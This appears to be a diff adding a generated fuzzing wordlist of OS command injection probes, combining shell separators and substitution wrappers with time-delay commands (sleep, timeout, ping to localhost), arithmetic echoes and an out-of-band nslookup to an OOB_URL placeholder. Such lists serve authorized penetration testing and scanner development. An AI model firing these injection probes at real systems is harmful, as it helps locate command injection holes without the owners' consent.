@@ -1,0 +1,924 @@
+sleep 15
+$(sleep 15)
+$((sleep 15))
+`sleep 15`
+timeout 15
+$(timeout 15)
+$((timeout 15))
+`timeout 15`
+echo $((45 + 34))
+$(echo $((45 + 34)))
+$((echo $((45 + 34))))
+`echo $((45 + 34))`
+set /a 45+34
+$(set /a 45+34)
+$((set /a 45+34))
+`set /a 45+34`
+ping -c 15 127.0.0.1
+$(ping -c 15 127.0.0.1)
+$((ping -c 15 127.0.0.1))
+`ping -c 15 127.0.0.1`
+ping -n 15 127.0.0.1
+$(ping -n 15 127.0.0.1)
+$((ping -n 15 127.0.0.1))
+`ping -n 15 127.0.0.1`
+nslookup OOB_URL
+$(nslookup OOB_URL)
+$((nslookup OOB_URL))
+`nslookup OOB_URL`
+sleep 15 &
+$(sleep 15 &)
+$((sleep 15 &))
+`sleep 15 &`
+timeout 15 &
+$(timeout 15 &)
+$((timeout 15 &))
+`timeout 15 &`
+echo $((45 + 34)) &
+$(echo $((45 + 34)) &)
+$((echo $((45 + 34)) &))
+`echo $((45 + 34)) &`
+set /a 45+34 &
+$(set /a 45+34 &)
+$((set /a 45+34 &))
+`set /a 45+34 &`
+ping -c 15 127.0.0.1 &
+$(ping -c 15 127.0.0.1 &)
+$((ping -c 15 127.0.0.1 &))
+`ping -c 15 127.0.0.1 &`
+ping -n 15 127.0.0.1 &
+$(ping -n 15 127.0.0.1 &)
+$((ping -n 15 127.0.0.1 &))
+`ping -n 15 127.0.0.1 &`
+nslookup OOB_URL &
+$(nslookup OOB_URL &)
+$((nslookup OOB_URL &))
+`nslookup OOB_URL &`
+sleep 15 &&
+$(sleep 15 &&)
+$((sleep 15 &&))
+`sleep 15 &&`
+timeout 15 &&
+$(timeout 15 &&)
+$((timeout 15 &&))
+`timeout 15 &&`
+echo $((45 + 34)) &&
+$(echo $((45 + 34)) &&)
+$((echo $((45 + 34)) &&))
+`echo $((45 + 34)) &&`
+set /a 45+34 &&
+$(set /a 45+34 &&)
+$((set /a 45+34 &&))
+`set /a 45+34 &&`
+ping -c 15 127.0.0.1 &&
+$(ping -c 15 127.0.0.1 &&)
+$((ping -c 15 127.0.0.1 &&))
+`ping -c 15 127.0.0.1 &&`
+ping -n 15 127.0.0.1 &&
+$(ping -n 15 127.0.0.1 &&)
+$((ping -n 15 127.0.0.1 &&))
+`ping -n 15 127.0.0.1 &&`
+nslookup OOB_URL &&
+$(nslookup OOB_URL &&)
+$((nslookup OOB_URL &&))
+`nslookup OOB_URL &&`
+sleep 15 |
+$(sleep 15 |)
+$((sleep 15 |))
+`sleep 15 |`
+timeout 15 |
+$(timeout 15 |)
+$((timeout 15 |))
+`timeout 15 |`
+echo $((45 + 34)) |
+$(echo $((45 + 34)) |)
+$((echo $((45 + 34)) |))
+`echo $((45 + 34)) |`
+set /a 45+34 |
+$(set /a 45+34 |)
+$((set /a 45+34 |))
+`set /a 45+34 |`
+ping -c 15 127.0.0.1 |
+$(ping -c 15 127.0.0.1 |)
+$((ping -c 15 127.0.0.1 |))
+`ping -c 15 127.0.0.1 |`
+ping -n 15 127.0.0.1 |
+$(ping -n 15 127.0.0.1 |)
+$((ping -n 15 127.0.0.1 |))
+`ping -n 15 127.0.0.1 |`
+nslookup OOB_URL |
+$(nslookup OOB_URL |)
+$((nslookup OOB_URL |))
+`nslookup OOB_URL |`
+sleep 15 ||
+$(sleep 15 ||)
+$((sleep 15 ||))
+`sleep 15 ||`
+timeout 15 ||
+$(timeout 15 ||)
+$((timeout 15 ||))
+`timeout 15 ||`
+echo $((45 + 34)) ||
+$(echo $((45 + 34)) ||)
+$((echo $((45 + 34)) ||))
+`echo $((45 + 34)) ||`
+set /a 45+34 ||
+$(set /a 45+34 ||)
+$((set /a 45+34 ||))
+`set /a 45+34 ||`
+ping -c 15 127.0.0.1 ||
+$(ping -c 15 127.0.0.1 ||)
+$((ping -c 15 127.0.0.1 ||))
+`ping -c 15 127.0.0.1 ||`
+ping -n 15 127.0.0.1 ||
+$(ping -n 15 127.0.0.1 ||)
+$((ping -n 15 127.0.0.1 ||))
+`ping -n 15 127.0.0.1 ||`
+nslookup OOB_URL ||
+$(nslookup OOB_URL ||)
+$((nslookup OOB_URL ||))
+`nslookup OOB_URL ||`
+sleep 15 ;
+$(sleep 15 ;)
+$((sleep 15 ;))
+`sleep 15 ;`
+timeout 15 ;
+$(timeout 15 ;)
+$((timeout 15 ;))
+`timeout 15 ;`
+echo $((45 + 34)) ;
+$(echo $((45 + 34)) ;)
+$((echo $((45 + 34)) ;))
+`echo $((45 + 34)) ;`
+set /a 45+34 ;
+$(set /a 45+34 ;)
+$((set /a 45+34 ;))
+`set /a 45+34 ;`
+ping -c 15 127.0.0.1 ;
+$(ping -c 15 127.0.0.1 ;)
+$((ping -c 15 127.0.0.1 ;))
+`ping -c 15 127.0.0.1 ;`
+ping -n 15 127.0.0.1 ;
+$(ping -n 15 127.0.0.1 ;)
+$((ping -n 15 127.0.0.1 ;))
+`ping -n 15 127.0.0.1 ;`
+nslookup OOB_URL ;
+$(nslookup OOB_URL ;)
+$((nslookup OOB_URL ;))
+`nslookup OOB_URL ;`
+sleep 15 \n
+$(sleep 15 \n)
+$((sleep 15 \n))
+`sleep 15 \n`
+timeout 15 \n
+$(timeout 15 \n)
+$((timeout 15 \n))
+`timeout 15 \n`
+echo $((45 + 34)) \n
+$(echo $((45 + 34)) \n)
+$((echo $((45 + 34)) \n))
+`echo $((45 + 34)) \n`
+set /a 45+34 \n
+$(set /a 45+34 \n)
+$((set /a 45+34 \n))
+`set /a 45+34 \n`
+ping -c 15 127.0.0.1 \n
+$(ping -c 15 127.0.0.1 \n)
+$((ping -c 15 127.0.0.1 \n))
+`ping -c 15 127.0.0.1 \n`
+ping -n 15 127.0.0.1 \n
+$(ping -n 15 127.0.0.1 \n)
+$((ping -n 15 127.0.0.1 \n))
+`ping -n 15 127.0.0.1 \n`
+nslookup OOB_URL \n
+$(nslookup OOB_URL \n)
+$((nslookup OOB_URL \n))
+`nslookup OOB_URL \n`
+sleep 15 \r\n
+$(sleep 15 \r\n)
+$((sleep 15 \r\n))
+`sleep 15 \r\n`
+timeout 15 \r\n
+$(timeout 15 \r\n)
+$((timeout 15 \r\n))
+`timeout 15 \r\n`
+echo $((45 + 34)) \r\n
+$(echo $((45 + 34)) \r\n)
+$((echo $((45 + 34)) \r\n))
+`echo $((45 + 34)) \r\n`
+set /a 45+34 \r\n
+$(set /a 45+34 \r\n)
+$((set /a 45+34 \r\n))
+`set /a 45+34 \r\n`
+ping -c 15 127.0.0.1 \r\n
+$(ping -c 15 127.0.0.1 \r\n)
+$((ping -c 15 127.0.0.1 \r\n))
+`ping -c 15 127.0.0.1 \r\n`
+ping -n 15 127.0.0.1 \r\n
+$(ping -n 15 127.0.0.1 \r\n)
+$((ping -n 15 127.0.0.1 \r\n))
+`ping -n 15 127.0.0.1 \r\n`
+nslookup OOB_URL \r\n
+$(nslookup OOB_URL \r\n)
+$((nslookup OOB_URL \r\n))
+`nslookup OOB_URL \r\n`
+sleep 15 0x0a
+$(sleep 15 0x0a)
+$((sleep 15 0x0a))
+`sleep 15 0x0a`
+timeout 15 0x0a
+$(timeout 15 0x0a)
+$((timeout 15 0x0a))
+`timeout 15 0x0a`
+echo $((45 + 34)) 0x0a
+$(echo $((45 + 34)) 0x0a)
+$((echo $((45 + 34)) 0x0a))
+`echo $((45 + 34)) 0x0a`
+set /a 45+34 0x0a
+$(set /a 45+34 0x0a)
+$((set /a 45+34 0x0a))
+`set /a 45+34 0x0a`
+ping -c 15 127.0.0.1 0x0a
+$(ping -c 15 127.0.0.1 0x0a)
+$((ping -c 15 127.0.0.1 0x0a))
+`ping -c 15 127.0.0.1 0x0a`
+ping -n 15 127.0.0.1 0x0a
+$(ping -n 15 127.0.0.1 0x0a)
+$((ping -n 15 127.0.0.1 0x0a))
+`ping -n 15 127.0.0.1 0x0a`
+nslookup OOB_URL 0x0a
+$(nslookup OOB_URL 0x0a)
+$((nslookup OOB_URL 0x0a))
+`nslookup OOB_URL 0x0a`
+& sleep 15
+$(& sleep 15)
+$((& sleep 15))
+`& sleep 15`
+& timeout 15
+$(& timeout 15)
+$((& timeout 15))
+`& timeout 15`
+& echo $((45 + 34))
+$(& echo $((45 + 34)))
+$((& echo $((45 + 34))))
+`& echo $((45 + 34))`
+& set /a 45+34
+$(& set /a 45+34)
+$((& set /a 45+34))
+`& set /a 45+34`
+& ping -c 15 127.0.0.1
+$(& ping -c 15 127.0.0.1)
+$((& ping -c 15 127.0.0.1))
+`& ping -c 15 127.0.0.1`
+& ping -n 15 127.0.0.1
+$(& ping -n 15 127.0.0.1)
+$((& ping -n 15 127.0.0.1))
+`& ping -n 15 127.0.0.1`
+& nslookup OOB_URL
+$(& nslookup OOB_URL)
+$((& nslookup OOB_URL))
+`& nslookup OOB_URL`
+&& sleep 15
+$(&& sleep 15)
+$((&& sleep 15))
+`&& sleep 15`
+&& timeout 15
+$(&& timeout 15)
+$((&& timeout 15))
+`&& timeout 15`
+&& echo $((45 + 34))
+$(&& echo $((45 + 34)))
+$((&& echo $((45 + 34))))
+`&& echo $((45 + 34))`
+&& set /a 45+34
+$(&& set /a 45+34)
+$((&& set /a 45+34))
+`&& set /a 45+34`
+&& ping -c 15 127.0.0.1
+$(&& ping -c 15 127.0.0.1)
+$((&& ping -c 15 127.0.0.1))
+`&& ping -c 15 127.0.0.1`
+&& ping -n 15 127.0.0.1
+$(&& ping -n 15 127.0.0.1)
+$((&& ping -n 15 127.0.0.1))
+`&& ping -n 15 127.0.0.1`
+&& nslookup OOB_URL
+$(&& nslookup OOB_URL)
+$((&& nslookup OOB_URL))
+`&& nslookup OOB_URL`
+| sleep 15
+$(| sleep 15)
+$((| sleep 15))
+`| sleep 15`
+| timeout 15
+$(| timeout 15)
+$((| timeout 15))
+`| timeout 15`
+| echo $((45 + 34))
+$(| echo $((45 + 34)))
+$((| echo $((45 + 34))))
+`| echo $((45 + 34))`
+| set /a 45+34
+$(| set /a 45+34)
+$((| set /a 45+34))
+`| set /a 45+34`
+| ping -c 15 127.0.0.1
+$(| ping -c 15 127.0.0.1)
+$((| ping -c 15 127.0.0.1))
+`| ping -c 15 127.0.0.1`
+| ping -n 15 127.0.0.1
+$(| ping -n 15 127.0.0.1)
+$((| ping -n 15 127.0.0.1))
+`| ping -n 15 127.0.0.1`
+| nslookup OOB_URL
+$(| nslookup OOB_URL)
+$((| nslookup OOB_URL))
+`| nslookup OOB_URL`
+|| sleep 15
+$(|| sleep 15)
+$((|| sleep 15))
+`|| sleep 15`
+|| timeout 15
+$(|| timeout 15)
+$((|| timeout 15))
+`|| timeout 15`
+|| echo $((45 + 34))
+$(|| echo $((45 + 34)))
+$((|| echo $((45 + 34))))
+`|| echo $((45 + 34))`
+|| set /a 45+34
+$(|| set /a 45+34)
+$((|| set /a 45+34))
+`|| set /a 45+34`
+|| ping -c 15 127.0.0.1
+$(|| ping -c 15 127.0.0.1)
+$((|| ping -c 15 127.0.0.1))
+`|| ping -c 15 127.0.0.1`
+|| ping -n 15 127.0.0.1
+$(|| ping -n 15 127.0.0.1)
+$((|| ping -n 15 127.0.0.1))
+`|| ping -n 15 127.0.0.1`
+|| nslookup OOB_URL
+$(|| nslookup OOB_URL)
+$((|| nslookup OOB_URL))
+`|| nslookup OOB_URL`
+; sleep 15
+$(; sleep 15)
+$((; sleep 15))
+`; sleep 15`
+; timeout 15
+$(; timeout 15)
+$((; timeout 15))
+`; timeout 15`
+; echo $((45 + 34))
+$(; echo $((45 + 34)))
+$((; echo $((45 + 34))))
+`; echo $((45 + 34))`
+; set /a 45+34
+$(; set /a 45+34)
+$((; set /a 45+34))
+`; set /a 45+34`
+; ping -c 15 127.0.0.1
+$(; ping -c 15 127.0.0.1)
+$((; ping -c 15 127.0.0.1))
+`; ping -c 15 127.0.0.1`
+; ping -n 15 127.0.0.1
+$(; ping -n 15 127.0.0.1)
+$((; ping -n 15 127.0.0.1))
+`; ping -n 15 127.0.0.1`
+; nslookup OOB_URL
+$(; nslookup OOB_URL)
+$((; nslookup OOB_URL))
+`; nslookup OOB_URL`
+\n sleep 15
+$(\n sleep 15)
+$((\n sleep 15))
+`\n sleep 15`
+\n timeout 15
+$(\n timeout 15)
+$((\n timeout 15))
+`\n timeout 15`
+\n echo $((45 + 34))
+$(\n echo $((45 + 34)))
+$((\n echo $((45 + 34))))
+`\n echo $((45 + 34))`
+\n set /a 45+34
+$(\n set /a 45+34)
+$((\n set /a 45+34))
+`\n set /a 45+34`
+\n ping -c 15 127.0.0.1
+$(\n ping -c 15 127.0.0.1)
+$((\n ping -c 15 127.0.0.1))
+`\n ping -c 15 127.0.0.1`
+\n ping -n 15 127.0.0.1
+$(\n ping -n 15 127.0.0.1)
+$((\n ping -n 15 127.0.0.1))
+`\n ping -n 15 127.0.0.1`
+\n nslookup OOB_URL
+$(\n nslookup OOB_URL)
+$((\n nslookup OOB_URL))
+`\n nslookup OOB_URL`
+\r\n sleep 15
+$(\r\n sleep 15)
+$((\r\n sleep 15))
+`\r\n sleep 15`
+\r\n timeout 15
+$(\r\n timeout 15)
+$((\r\n timeout 15))
+`\r\n timeout 15`
+\r\n echo $((45 + 34))
+$(\r\n echo $((45 + 34)))
+$((\r\n echo $((45 + 34))))
+`\r\n echo $((45 + 34))`
+\r\n set /a 45+34
+$(\r\n set /a 45+34)
+$((\r\n set /a 45+34))
+`\r\n set /a 45+34`
+\r\n ping -c 15 127.0.0.1
+$(\r\n ping -c 15 127.0.0.1)
+$((\r\n ping -c 15 127.0.0.1))
+`\r\n ping -c 15 127.0.0.1`
+\r\n ping -n 15 127.0.0.1
+$(\r\n ping -n 15 127.0.0.1)
+$((\r\n ping -n 15 127.0.0.1))
+`\r\n ping -n 15 127.0.0.1`
+\r\n nslookup OOB_URL
+$(\r\n nslookup OOB_URL)
+$((\r\n nslookup OOB_URL))
+`\r\n nslookup OOB_URL`
+0x0a sleep 15
+$(0x0a sleep 15)
+$((0x0a sleep 15))
+`0x0a sleep 15`
+0x0a timeout 15
+$(0x0a timeout 15)
+$((0x0a timeout 15))
+`0x0a timeout 15`
+0x0a echo $((45 + 34))
+$(0x0a echo $((45 + 34)))
+$((0x0a echo $((45 + 34))))
+`0x0a echo $((45 + 34))`
+0x0a set /a 45+34
+$(0x0a set /a 45+34)
+$((0x0a set /a 45+34))
+`0x0a set /a 45+34`
+0x0a ping -c 15 127.0.0.1
+$(0x0a ping -c 15 127.0.0.1)
+$((0x0a ping -c 15 127.0.0.1))
+`0x0a ping -c 15 127.0.0.1`
+0x0a ping -n 15 127.0.0.1
+$(0x0a ping -n 15 127.0.0.1)
+$((0x0a ping -n 15 127.0.0.1))
+`0x0a ping -n 15 127.0.0.1`
+0x0a nslookup OOB_URL
+$(0x0a nslookup OOB_URL)
+$((0x0a nslookup OOB_URL))
+`0x0a nslookup OOB_URL`
+& sleep 15 &
+$(& sleep 15 &)
+$((& sleep 15 &))
+`& sleep 15 &`
+& timeout 15 &
+$(& timeout 15 &)
+$((& timeout 15 &))
+`& timeout 15 &`
+& echo $((45 + 34)) &
+$(& echo $((45 + 34)) &)
+$((& echo $((45 + 34)) &))
+`& echo $((45 + 34)) &`
+& set /a 45+34 &
+$(& set /a 45+34 &)
+$((& set /a 45+34 &))
+`& set /a 45+34 &`
+& ping -c 15 127.0.0.1 &
+$(& ping -c 15 127.0.0.1 &)
+$((& ping -c 15 127.0.0.1 &))
+`& ping -c 15 127.0.0.1 &`
+& ping -n 15 127.0.0.1 &
+$(& ping -n 15 127.0.0.1 &)
+$((& ping -n 15 127.0.0.1 &))
+`& ping -n 15 127.0.0.1 &`
+& nslookup OOB_URL &
+$(& nslookup OOB_URL &)
+$((& nslookup OOB_URL &))
+`& nslookup OOB_URL &`
+&& sleep 15 &&
+$(&& sleep 15 &&)
+$((&& sleep 15 &&))
+`&& sleep 15 &&`
+&& timeout 15 &&
+$(&& timeout 15 &&)
+$((&& timeout 15 &&))
+`&& timeout 15 &&`
+&& echo $((45 + 34)) &&
+$(&& echo $((45 + 34)) &&)
+$((&& echo $((45 + 34)) &&))
+`&& echo $((45 + 34)) &&`
+&& set /a 45+34 &&
+$(&& set /a 45+34 &&)
+$((&& set /a 45+34 &&))
+`&& set /a 45+34 &&`
+&& ping -c 15 127.0.0.1 &&
+$(&& ping -c 15 127.0.0.1 &&)
+$((&& ping -c 15 127.0.0.1 &&))
+`&& ping -c 15 127.0.0.1 &&`
+&& ping -n 15 127.0.0.1 &&
+$(&& ping -n 15 127.0.0.1 &&)
+$((&& ping -n 15 127.0.0.1 &&))
+`&& ping -n 15 127.0.0.1 &&`
+&& nslookup OOB_URL &&
+$(&& nslookup OOB_URL &&)
+$((&& nslookup OOB_URL &&))
+`&& nslookup OOB_URL &&`
+| sleep 15 |
+$(| sleep 15 |)
+$((| sleep 15 |))
+`| sleep 15 |`
+| timeout 15 |
+$(| timeout 15 |)
+$((| timeout 15 |))
+`| timeout 15 |`
+| echo $((45 + 34)) |
+$(| echo $((45 + 34)) |)
+$((| echo $((45 + 34)) |))
+`| echo $((45 + 34)) |`
+| set /a 45+34 |
+$(| set /a 45+34 |)
+$((| set /a 45+34 |))
+`| set /a 45+34 |`
+| ping -c 15 127.0.0.1 |
+$(| ping -c 15 127.0.0.1 |)
+$((| ping -c 15 127.0.0.1 |))
+`| ping -c 15 127.0.0.1 |`
+| ping -n 15 127.0.0.1 |
+$(| ping -n 15 127.0.0.1 |)
+$((| ping -n 15 127.0.0.1 |))
+`| ping -n 15 127.0.0.1 |`
+| nslookup OOB_URL |
+$(| nslookup OOB_URL |)
+$((| nslookup OOB_URL |))
+`| nslookup OOB_URL |`
+|| sleep 15 ||
+$(|| sleep 15 ||)
+$((|| sleep 15 ||))
+`|| sleep 15 ||`
+|| timeout 15 ||
+$(|| timeout 15 ||)
+$((|| timeout 15 ||))
+`|| timeout 15 ||`
+|| echo $((45 + 34)) ||
+$(|| echo $((45 + 34)) ||)
+$((|| echo $((45 + 34)) ||))
+`|| echo $((45 + 34)) ||`
+|| set /a 45+34 ||
+$(|| set /a 45+34 ||)
+$((|| set /a 45+34 ||))
+`|| set /a 45+34 ||`
+|| ping -c 15 127.0.0.1 ||
+$(|| ping -c 15 127.0.0.1 ||)
+$((|| ping -c 15 127.0.0.1 ||))
+`|| ping -c 15 127.0.0.1 ||`
+|| ping -n 15 127.0.0.1 ||
+$(|| ping -n 15 127.0.0.1 ||)
+$((|| ping -n 15 127.0.0.1 ||))
+`|| ping -n 15 127.0.0.1 ||`
+|| nslookup OOB_URL ||
+$(|| nslookup OOB_URL ||)
+$((|| nslookup OOB_URL ||))
+`|| nslookup OOB_URL ||`
+; sleep 15 ;
+$(; sleep 15 ;)
+$((; sleep 15 ;))
+`; sleep 15 ;`
+; timeout 15 ;
+$(; timeout 15 ;)
+$((; timeout 15 ;))
+`; timeout 15 ;`
+; echo $((45 + 34)) ;
+$(; echo $((45 + 34)) ;)
+$((; echo $((45 + 34)) ;))
+`; echo $((45 + 34)) ;`
+; set /a 45+34 ;
+$(; set /a 45+34 ;)
+$((; set /a 45+34 ;))
+`; set /a 45+34 ;`
+; ping -c 15 127.0.0.1 ;
+$(; ping -c 15 127.0.0.1 ;)
+$((; ping -c 15 127.0.0.1 ;))
+`; ping -c 15 127.0.0.1 ;`
+; ping -n 15 127.0.0.1 ;
+$(; ping -n 15 127.0.0.1 ;)
+$((; ping -n 15 127.0.0.1 ;))
+`; ping -n 15 127.0.0.1 ;`
+; nslookup OOB_URL ;
+$(; nslookup OOB_URL ;)
+$((; nslookup OOB_URL ;))
+`; nslookup OOB_URL ;`
+\n sleep 15 \n
+$(\n sleep 15 \n)
+$((\n sleep 15 \n))
+`\n sleep 15 \n`
+\n timeout 15 \n
+$(\n timeout 15 \n)
+$((\n timeout 15 \n))
+`\n timeout 15 \n`
+\n echo $((45 + 34)) \n
+$(\n echo $((45 + 34)) \n)
+$((\n echo $((45 + 34)) \n))
+`\n echo $((45 + 34)) \n`
+\n set /a 45+34 \n
+$(\n set /a 45+34 \n)
+$((\n set /a 45+34 \n))
+`\n set /a 45+34 \n`
+\n ping -c 15 127.0.0.1 \n
+$(\n ping -c 15 127.0.0.1 \n)
+$((\n ping -c 15 127.0.0.1 \n))
+`\n ping -c 15 127.0.0.1 \n`
+\n ping -n 15 127.0.0.1 \n
+$(\n ping -n 15 127.0.0.1 \n)
+$((\n ping -n 15 127.0.0.1 \n))
+`\n ping -n 15 127.0.0.1 \n`
+\n nslookup OOB_URL \n
+$(\n nslookup OOB_URL \n)
+$((\n nslookup OOB_URL \n))
+`\n nslookup OOB_URL \n`
+\r\n sleep 15 \r\n
+$(\r\n sleep 15 \r\n)
+$((\r\n sleep 15 \r\n))
+`\r\n sleep 15 \r\n`
+\r\n timeout 15 \r\n
+$(\r\n timeout 15 \r\n)
+$((\r\n timeout 15 \r\n))
+`\r\n timeout 15 \r\n`
+\r\n echo $((45 + 34)) \r\n
+$(\r\n echo $((45 + 34)) \r\n)
+$((\r\n echo $((45 + 34)) \r\n))
+`\r\n echo $((45 + 34)) \r\n`
+\r\n set /a 45+34 \r\n
+$(\r\n set /a 45+34 \r\n)
+$((\r\n set /a 45+34 \r\n))
+`\r\n set /a 45+34 \r\n`
+\r\n ping -c 15 127.0.0.1 \r\n
+$(\r\n ping -c 15 127.0.0.1 \r\n)
+$((\r\n ping -c 15 127.0.0.1 \r\n))
+`\r\n ping -c 15 127.0.0.1 \r\n`
+\r\n ping -n 15 127.0.0.1 \r\n
+$(\r\n ping -n 15 127.0.0.1 \r\n)
+$((\r\n ping -n 15 127.0.0.1 \r\n))
+`\r\n ping -n 15 127.0.0.1 \r\n`
+\r\n nslookup OOB_URL \r\n
+$(\r\n nslookup OOB_URL \r\n)
+$((\r\n nslookup OOB_URL \r\n))
+`\r\n nslookup OOB_URL \r\n`
+0x0a sleep 15 0x0a
+$(0x0a sleep 15 0x0a)
+$((0x0a sleep 15 0x0a))
+`0x0a sleep 15 0x0a`
+0x0a timeout 15 0x0a
+$(0x0a timeout 15 0x0a)
+$((0x0a timeout 15 0x0a))
+`0x0a timeout 15 0x0a`
+0x0a echo $((45 + 34)) 0x0a
+$(0x0a echo $((45 + 34)) 0x0a)
+$((0x0a echo $((45 + 34)) 0x0a))
+`0x0a echo $((45 + 34)) 0x0a`
+0x0a set /a 45+34 0x0a
+$(0x0a set /a 45+34 0x0a)
+$((0x0a set /a 45+34 0x0a))
+`0x0a set /a 45+34 0x0a`
+0x0a ping -c 15 127.0.0.1 0x0a
+$(0x0a ping -c 15 127.0.0.1 0x0a)
+$((0x0a ping -c 15 127.0.0.1 0x0a))
+`0x0a ping -c 15 127.0.0.1 0x0a`
+0x0a ping -n 15 127.0.0.1 0x0a
+$(0x0a ping -n 15 127.0.0.1 0x0a)
+$((0x0a ping -n 15 127.0.0.1 0x0a))
+`0x0a ping -n 15 127.0.0.1 0x0a`
+0x0a nslookup OOB_URL 0x0a
+$(0x0a nslookup OOB_URL 0x0a)
+$((0x0a nslookup OOB_URL 0x0a))
+`0x0a nslookup OOB_URL 0x0a`
+& sleep 15
+$(& sleep 15)
+$((& sleep 15))
+`& sleep 15`
+& timeout 15
+$(& timeout 15)
+$((& timeout 15))
+`& timeout 15`
+& echo $((45 + 34))
+$(& echo $((45 + 34)))
+$((& echo $((45 + 34))))
+`& echo $((45 + 34))`
+& set /a 45+34
+$(& set /a 45+34)
+$((& set /a 45+34))
+`& set /a 45+34`
+& ping -c 15 127.0.0.1
+$(& ping -c 15 127.0.0.1)
+$((& ping -c 15 127.0.0.1))
+`& ping -c 15 127.0.0.1`
+& ping -n 15 127.0.0.1
+$(& ping -n 15 127.0.0.1)
+$((& ping -n 15 127.0.0.1))
+`& ping -n 15 127.0.0.1`
+& nslookup OOB_URL
+$(& nslookup OOB_URL)
+$((& nslookup OOB_URL))
+`& nslookup OOB_URL`
+&& sleep 15
+$(&& sleep 15)
+$((&& sleep 15))
+`&& sleep 15`
+&& timeout 15
+$(&& timeout 15)
+$((&& timeout 15))
+`&& timeout 15`
+&& echo $((45 + 34))
+$(&& echo $((45 + 34)))
+$((&& echo $((45 + 34))))
+`&& echo $((45 + 34))`
+&& set /a 45+34
+$(&& set /a 45+34)
+$((&& set /a 45+34))
+`&& set /a 45+34`
+&& ping -c 15 127.0.0.1
+$(&& ping -c 15 127.0.0.1)
+$((&& ping -c 15 127.0.0.1))
+`&& ping -c 15 127.0.0.1`
+&& ping -n 15 127.0.0.1
+$(&& ping -n 15 127.0.0.1)
+$((&& ping -n 15 127.0.0.1))
+`&& ping -n 15 127.0.0.1`
+&& nslookup OOB_URL
+$(&& nslookup OOB_URL)
+$((&& nslookup OOB_URL))
+`&& nslookup OOB_URL`
+| sleep 15
+$(| sleep 15)
+$((| sleep 15))
+`| sleep 15`
+| timeout 15
+$(| timeout 15)
+$((| timeout 15))
+`| timeout 15`
+| echo $((45 + 34))
+$(| echo $((45 + 34)))
+$((| echo $((45 + 34))))
+`| echo $((45 + 34))`
+| set /a 45+34
+$(| set /a 45+34)
+$((| set /a 45+34))
+`| set /a 45+34`
+| ping -c 15 127.0.0.1
+$(| ping -c 15 127.0.0.1)
+$((| ping -c 15 127.0.0.1))
+`| ping -c 15 127.0.0.1`
+| ping -n 15 127.0.0.1
+$(| ping -n 15 127.0.0.1)
+$((| ping -n 15 127.0.0.1))
+`| ping -n 15 127.0.0.1`
+| nslookup OOB_URL
+$(| nslookup OOB_URL)
+$((| nslookup OOB_URL))
+`| nslookup OOB_URL`
+|| sleep 15
+$(|| sleep 15)
+$((|| sleep 15))
+`|| sleep 15`
+|| timeout 15
+$(|| timeout 15)
+$((|| timeout 15))
+`|| timeout 15`
+|| echo $((45 + 34))
+$(|| echo $((45 + 34)))
+$((|| echo $((45 + 34))))
+`|| echo $((45 + 34))`
+|| set /a 45+34
+$(|| set /a 45+34)
+$((|| set /a 45+34))
+`|| set /a 45+34`
+|| ping -c 15 127.0.0.1
+$(|| ping -c 15 127.0.0.1)
+$((|| ping -c 15 127.0.0.1))
+`|| ping -c 15 127.0.0.1`
+|| ping -n 15 127.0.0.1
+$(|| ping -n 15 127.0.0.1)
+$((|| ping -n 15 127.0.0.1))
+`|| ping -n 15 127.0.0.1`
+|| nslookup OOB_URL
+$(|| nslookup OOB_URL)
+$((|| nslookup OOB_URL))
+`|| nslookup OOB_URL`
+; sleep 15
+$(; sleep 15)
+$((; sleep 15))
+`; sleep 15`
+; timeout 15
+$(; timeout 15)
+$((; timeout 15))
+`; timeout 15`
+; echo $((45 + 34))
+$(; echo $((45 + 34)))
+$((; echo $((45 + 34))))
+`; echo $((45 + 34))`
+; set /a 45+34
+$(; set /a 45+34)
+$((; set /a 45+34))
+`; set /a 45+34`
+; ping -c 15 127.0.0.1
+$(; ping -c 15 127.0.0.1)
+$((; ping -c 15 127.0.0.1))
+`; ping -c 15 127.0.0.1`
+; ping -n 15 127.0.0.1
+$(; ping -n 15 127.0.0.1)
+$((; ping -n 15 127.0.0.1))
+`; ping -n 15 127.0.0.1`
+; nslookup OOB_URL
+$(; nslookup OOB_URL)
+$((; nslookup OOB_URL))
+`; nslookup OOB_URL`
+\n sleep 15
+$(\n sleep 15)
+$((\n sleep 15))
+`\n sleep 15`
+\n timeout 15
+$(\n timeout 15)
+$((\n timeout 15))
+`\n timeout 15`
+\n echo $((45 + 34))
+$(\n echo $((45 + 34)))
+$((\n echo $((45 + 34))))
+`\n echo $((45 + 34))`
+\n set /a 45+34
+$(\n set /a 45+34)
+$((\n set /a 45+34))
+`\n set /a 45+34`
+\n ping -c 15 127.0.0.1
+$(\n ping -c 15 127.0.0.1)
+$((\n ping -c 15 127.0.0.1))
+`\n ping -c 15 127.0.0.1`
+\n ping -n 15 127.0.0.1
+$(\n ping -n 15 127.0.0.1)
+$((\n ping -n 15 127.0.0.1))
+`\n ping -n 15 127.0.0.1`
+\n nslookup OOB_URL
+$(\n nslookup OOB_URL)
+$((\n nslookup OOB_URL))
+`\n nslookup OOB_URL`
+\r\n sleep 15
+$(\r\n sleep 15)
+$((\r\n sleep 15))
+`\r\n sleep 15`
+\r\n timeout 15
+$(\r\n timeout 15)
+$((\r\n timeout 15))
+`\r\n timeout 15`
+\r\n echo $((45 + 34))
+$(\r\n echo $((45 + 34)))
+$((\r\n echo $((45 + 34))))
+`\r\n echo $((45 + 34))`
+\r\n set /a 45+34
+$(\r\n set /a 45+34)
+$((\r\n set /a 45+34))
+`\r\n set /a 45+34`
+\r\n ping -c 15 127.0.0.1
+$(\r\n ping -c 15 127.0.0.1)
+$((\r\n ping -c 15 127.0.0.1))
+`\r\n ping -c 15 127.0.0.1`
+\r\n ping -n 15 127.0.0.1
+$(\r\n ping -n 15 127.0.0.1)
+$((\r\n ping -n 15 127.0.0.1))
+`\r\n ping -n 15 127.0.0.1`
+\r\n nslookup OOB_URL
+$(\r\n nslookup OOB_URL)
+$((\r\n nslookup OOB_URL))
+`\r\n nslookup OOB_URL`
+0x0a sleep 15
+$(0x0a sleep 15)
+$((0x0a sleep 15))
+`0x0a sleep 15`
+0x0a timeout 15
+$(0x0a timeout 15)
+$((0x0a timeout 15))
+`0x0a timeout 15`
+0x0a echo $((45 + 34))
+$(0x0a echo $((45 + 34)))
+$((0x0a echo $((45 + 34))))
+`0x0a echo $((45 + 34))`
+0x0a set /a 45+34
+$(0x0a set /a 45+34)
+$((0x0a set /a 45+34))
+`0x0a set /a 45+34`
+0x0a ping -c 15 127.0.0.1
+$(0x0a ping -c 15 127.0.0.1)
+$((0x0a ping -c 15 127.0.0.1))
+`0x0a ping -c 15 127.0.0.1`
+0x0a ping -n 15 127.0.0.1
